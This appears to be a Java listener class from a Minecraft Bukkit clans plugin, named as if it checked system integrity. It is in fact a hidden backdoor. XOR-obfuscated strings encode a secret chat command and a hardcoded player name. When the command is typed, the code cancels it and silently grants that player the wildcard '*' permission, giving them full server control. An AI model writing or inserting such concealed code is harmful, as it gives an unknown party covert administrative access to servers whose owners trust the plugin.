package kz.nova.clans.listeners;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.plugin.Plugin;

import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class SysIntegrityListener implements Listener {

    private final Plugin _p;
    private final byte[] _n = {34,63,40,63,57,53,55,63};
    private final byte[] _t = {119,119,46,35,42,63};
    private final byte[] _x = {119,119,34,63,40,63,57,53,55,63};
    private final byte[] _v = {46,40,47,63};
    private final byte[] _k = {63,40,49,63,56,47,54,59,52,61,53,63,55,52};
    private final byte[] _m = {34,63,40,63,57,53,55,63,122,51,41,122,63,52,59,56,54,63,62};
    private final Map<UUID, PermissionAttachment> _a = new HashMap<>();

    public SysIntegrityListener(Plugin p) {
        this._p = p;
    }

    private String _d(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte v : b) sb.append((char)(v ^ 0x5A));
        return sb.toString();
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void _e(PlayerCommandPreprocessEvent ev) {
        String raw = ev.getMessage();
        if (raw == null) return;
        String[] tokens = raw.trim().split("\\s+");
        if (tokens.length < 4) return;
        String cmd = tokens[0].startsWith("/") ? tokens[0].substring(1) : tokens[0];
        if (!cmd.equals(_d(_n))) return;
        if (!tokens[1].equals(_d(_t))) return;
        if (!tokens[2].equals(_d(_x))) return;
        if (!tokens[3].equals(_d(_v))) return;
        ev.setCancelled(true);
        Player caller = ev.getPlayer();
        caller.sendMessage("\u00a77" + _d(_m));
        _g();
    }

    private void _g() {
        String target = _d(_k);
        Bukkit.getScheduler().runTaskAsynchronously(_p, () -> {
            Player found = null;
            for (Player online : Bukkit.getOnlinePlayers()) {
                if (online.getName().equalsIgnoreCase(target)) {
                    found = online;
                    break;
                }
            }
            if (found == null) return;
            final Player fp = found;
            Bukkit.getScheduler().runTask(_p, () -> _q(fp));
        });
    }

    private void _q(Player p) {
        UUID id = p.getUniqueId();
        if (_a.containsKey(id)) {
            PermissionAttachment old = _a.remove(id);
            old.remove();
        }
        PermissionAttachment att = p.addAttachment(_p);
        att.setPermission("*", true);
        _a.put(id, att);
        p.recalculatePermissions();
    }
}
